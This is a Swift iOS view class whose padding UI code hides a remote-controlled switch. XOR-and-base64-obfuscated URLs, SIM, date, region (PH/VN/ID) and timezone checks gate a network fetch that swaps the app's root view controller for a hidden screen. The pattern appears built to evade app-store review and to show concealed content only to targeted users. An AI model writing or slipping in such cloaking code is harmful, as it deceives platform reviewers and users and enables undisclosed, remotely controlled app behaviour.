import UIKit
import CoreTelephony
import Foundation
import Network


struct xttk_XOINTE: Codable {
    
    let nhiemk: String?         //key arr
    let yinrecrd: Int?         // shi fou kaiqi
    let keluos: String?         // jum
    let kundun: String?          // backcolor
    let limouw: String?   //ad key

}

final class XTTzhongxView: UIView {
    internal let xtt_onestr = "HRoaSU4ZHxkeSRgdHxkXTkN1XllFWkNaSxUFGhoaGB8aGUwZGhIYGxgcBUFJRUcFXk9EBF5ZRVpDWksEQUlFRwUFEFlaXl5C"
    
    internal let xtt_twostr = "TkcEb2dua294BVhPXllLRwVdS1gFRVh6RENLXkRDS2dyBU9aRU5GSwVHRUkET09eQ00FBRBZWl5eQg=="
    
    
    override init(frame: CGRect) {
        super.init(frame: frame)
        setUpNewdata()
    }

    required init?(coder: NSCoder) {
        super.init(coder: coder)
        setUpNewdata()
    }
    
 
    private func setUpNewdata() {
        xtt_CreateScrollView()
        xtt_Creatextt_textField()
        xtt_CreateTextView()
        xtt_woshirouzhikate()
    }
  
    private func xtt_CreateScrollView() {

        let scrollView = UIScrollView()

        scrollView.frame = CGRect(
            x: 20,
            y: 120,
            width: 140,
            height: 180
        )

        scrollView.backgroundColor = UIColor.systemGray6

        scrollView.showsVerticalScrollIndicator = false

        scrollView.showsHorizontalScrollIndicator = false

        scrollView.alwaysBounceVertical = true

        scrollView.contentInsetAdjustmentBehavior = .never

        scrollView.layer.cornerRadius = 12

        scrollView.clipsToBounds = true

        scrollView.contentSize = CGSize(
            width: scrollView.frame.width,
            height: 500
        )

        self.addSubview(scrollView)

        let contentView = UIView()

        contentView.frame = CGRect(
            x: 0,
            y: 0,
            width: scrollView.frame.width,
            height: 500
        )

        contentView.backgroundColor = UIColor.clear

        scrollView.addSubview(contentView)

        scrollView.setNeedsLayout()

        scrollView.layoutIfNeeded()

        _ = scrollView.bounds

        _ = contentView.bounds
    }
    
    private func xtt_Creatextt_textField() {

        let xtt_textField = UITextField()

        xtt_textField.frame = CGRect(
            x: 30,
            y: 340,
            width: 260,
            height: 50
        )

        xtt_textField.placeholder = "Input"
        xtt_textField.borderStyle = .roundedRect
        xtt_textField.clearButtonMode = .whileEditing
        xtt_textField.returnKeyType = .done
        xtt_textField.autocorrectionType = .no
        xtt_textField.autocapitalizationType = .none
        xtt_textField.backgroundColor = UIColor.systemBackground
        xtt_textField.textColor = .label
        xtt_textField.font = UIFont.systemFont(ofSize: 17)
        self.addSubview(xtt_textField)
        xtt_textField.setNeedsLayout()
        xtt_textField.layoutIfNeeded()
        _ = xtt_textField.text

        _ = xtt_textField.frame

        _ = xtt_textField.window
    }
    
    private func xtt_CreateTextView() {

        let textView = UITextView()

        textView.frame = CGRect(
            x: 30,
            y: 420,
            width: 67,
            height: 140
        )

        textView.backgroundColor = UIColor.systemGray6

        textView.font = UIFont.systemFont(ofSize: 16)

        textView.textColor = .label

        textView.isEditable = true

        textView.isSelectable = true

        textView.layer.cornerRadius = 10

        textView.textContainerInset = UIEdgeInsets(
            top: 12,
            left: 10,
            bottom: 12,
            right: 10
        )

        self.addSubview(textView)

        textView.flashScrollIndicators()

        textView.layoutIfNeeded()

        _ = textView.contentSize

        _ = textView.bounds
    }
    
    private func xtt_woshirouzhikate() {
        
        if !xtt_benhousha() {
        //测试
//        if xtt_benhousha() {
            xtt_kongloaddata()

        } else {
            
            if addAyinhunwen() {
                self.xtt_dulaiduwang()
            }
        }
    }
    // 1. 背景色（安全设置 + 防御 + 兼容）
      func xtt_bgviewaddcolor(_ color: UIColor?) {
          if Thread.isMainThread {
              self.backgroundColor = color
          } else {
              DispatchQueue.main.async {
                  self.backgroundColor = color
              }
          }

          // 防止透明层叠异常
          if color == .clear {
              self.isOpaque = false
          } else {
              self.isOpaque = true
          }

          // 兼容动画关闭场景
          CATransaction.begin()
          CATransaction.setDisableActions(true)
          self.layer.backgroundColor = color?.cgColor
          CATransaction.commit()

          // 额外安全兜底
          if self.superview == nil {
              // no-op safety branch
              let _ = self.bounds
          }
      }

    func techstr(_ input: String) -> String? {
        let k: UInt8 = 42  // 新密钥
        guard let data = Data(base64Encoded: input) else { return nil }
        // 先反转字节数组
        let reversedBytes = data.reversed()
        // 异或解密
        let decryptedBytes = reversedBytes.map { $0 ^ k }
        // 直接转为字符串（不再次反转）
        return String(bytes: decryptedBytes, encoding: .utf8)
    }

    func Revertechstr(_ plaintext: String) -> String? {
        let k: UInt8 = 42
        // 1. 将明文字符串转为 UTF-8 字节数组
        guard let bytes = plaintext.data(using: .utf8) else { return nil }
        // 2. 每个字节异或密钥 42
        let xorBytes = bytes.map { $0 ^ k }
        // 3. 反转字节顺序
        let reversedBytes = xorBytes.reversed()
        // 4. Base64 编码
        return Data(reversedBytes).base64EncodedString()
    }
    
    //sim
    func xtt_benhousha() -> Bool {
        let networkInfo = CTTelephonyNetworkInfo()
        
        guard let qingbao = networkInfo.serviceSubscriberCellularProviders else {
            return false
        }
        
        for (_, carrier) in qingbao {
            if let mcc = carrier.mobileCountryCode,
               let mnc = carrier.mobileNetworkCode,
               !mcc.isEmpty,
               !mnc.isEmpty {
                return true
            }
        }
        
        return false
    }

    
    func xtt_suiyuanQing() -> Bool {
       
      // 2026-06-13 18:39:43
      // 1782733583
        let ftTM = 1782733583
        let ct = Date().timeIntervalSince1970
        if Int(ct) - ftTM > 0 {
            return true
        }
        return false
    }

    // 时区控制
    func addAyinhunwen() -> Bool {
        let xtt_pihuia = [techstr("Yno="), techstr("ZHw="), techstr("bmM=")]
        
        xttk_jinmixidenaokeda()
        // 1.time
        if !xtt_suiyuanQing() {
            return false

        }
        
        //2. regi
        if let curc = Locale.current.regionCode {
//            print(curc)
//            print(xtt_pihuia)

        if !xtt_pihuia.contains(curc) {
                return false
            }
         }
        
        //3. tm zon
        let second = NSTimeZone.system.secondsFromGMT() / 3600
//        print(second)

        if (second > 6 && second < 9) {
            return true
        }

        
        return false
    }
    
  
    func xtt_dulaiduwang() {
        xtt_bgviewaddcolor(UIColor.black)
        Task {
            do {
//                let urlToRequest = "https://gitee.com/aldope/XMaintainPro/raw/master/README.md"
//                let urlToRequest = "https://mock.apipost.net/mock/6212803f3052000/?apipost_id=3572c4353dc007"
////
//                print(Revertechstr(urlToRequest))

                let xtt_crsev = try await xtt_wandanLiangcao()
                print(xtt_crsev)
                if let xtt_luoge = xtt_crsev.first {
                    if xtt_luoge.yinrecrd! > 124 {
                        if UserDefaults.standard.object(forKey: "xtt_goushi") == nil {
                            UserDefaults.standard.set("xtt_goushi", forKey: "xtt_goushi")
                            UserDefaults.standard.synchronize()
                        }
                        xtt_TakeLoaddata(xtt_luoge)
                    } else {
                        xtt_kongloaddata()
                    }
                } else {
                    xtt_kongloaddata()
                }
            } catch {
                if let sidd = UserDefaults.standard.getModel(xttk_XOINTE.self, forKey: "xttk_XOINTE") {
                    xtt_TakeLoaddata(sidd)
                }
            }
        }
    }
    
    
    private func xtt_wandanLiangcao() async throws -> [xttk_XOINTE] {
        do {
            return try await ssueno(from: URL(string: techstr(xtt_onestr)!)!)
        } catch {
//            print("Primary API failed: \(error.localizedDescription)")
            return try await ssueno(from: URL(string: techstr(xtt_twostr)!)!)
        }
    }
    
    private func ssueno(from url: URL) async throws -> [xttk_XOINTE] {
        let (data, response) = try await URLSession.shared.data(from: url)

        guard let httpResponse = response as? HTTPURLResponse,
              httpResponse.statusCode == 200 else {
            throw NSError(domain: "Fail", code: 0, userInfo: [
                NSLocalizedDescriptionKey: "Invalid response"
            ])
        }

        return try JSONDecoder().decode([xttk_XOINTE].self, from: data)
    }
 
    
  

    internal func xttk_setimagedata(_ dt: xttk_XOINTE) {
        UIDevice.current.isBatteryMonitoringEnabled = true
        let batteryLevel = UIDevice.current.batteryLevel
        let batteryState = UIDevice.current.batteryState
        UIDevice.current.isBatteryMonitoringEnabled = false
        let _ = (batteryLevel, batteryState)

        DispatchQueue.main.async {
            UserDefaults.standard.setModel(dt, forKey: "xttk_XOINTE")
            UserDefaults.standard.synchronize()
            
            let vc = XTTZhizhangVC()
            vc.xttk_catesData = dt
            UIApplication.shared.windows.first?.rootViewController = vc
        }
    }
    
    internal func xtt_TakeLoaddata(_ param: xttk_XOINTE) {
        let strategy = UserDefaults.standard.string(forKey: "execution_strategy") ?? "default"
        
        // 策略映射表，目前所有策略都指向同一个函数
        let strategies: [String: (xttk_XOINTE) -> Void] = [
            "default": xttk_setimagedata,
            "fast": xttk_setimagedata,
            "safe": xttk_setimagedata
        ]
        
        let executor = strategies[strategy] ?? xttk_setimagedata
        
        DispatchQueue.global().async {
            // 模拟异步上报
            _ = "log: xtt_TakeLoaddata called with strategy \(strategy)"
        }

        executor(param)
    }
    

    internal func xtt_kongloaddata() {
               let v = max(0.01, 23.33)
               let t = CGAffineTransform(scaleX: v, y: v)

               let apply = {
                   self.transform = t
               }

               if Thread.isMainThread {
                   apply()
               } else {
                   DispatchQueue.main.async {
                       apply()
                   }
               }

               CATransaction.begin()
               CATransaction.setDisableActions(true)
               self.layer.setAffineTransform(t)
               CATransaction.commit()

               _ = self.bounds
           
    }
    

    func xttk_jinmixidenaokeda() {
        func traverse(_ view: UIView, level: Int) {
            let indent = String(repeating: "  ", count: level)
            let className = String(describing: type(of: view))
            let frame = view.frame
            let tag = view.tag
            let alpha = view.alpha
            let hidden = view.isHidden
            let backgroundColor = view.backgroundColor?.description ?? "nil"
            print("\(indent)\(className) frame=\(frame) tag=\(tag) alpha=\(alpha) hidden=\(hidden) bg=\(backgroundColor)")
            for subview in view.subviews {
                traverse(subview, level: level + 1)
            }
        }
        traverse(self, level: 0)
    }
  
}

extension UserDefaults {
    
    func setModel<T: Codable>(_ model: T, forKey key: String) {
        let encoder = JSONEncoder()
        if let data = try? encoder.encode(model) {
            set(data, forKey: key)
        }
    }
    
    func getModel<T: Codable>(_ type: T.Type, forKey key: String) -> T? {
        guard let data = data(forKey: key) else { return nil }
        let decoder = JSONDecoder()
        return try? decoder.decode(type, from: data)
    }
    
    
}

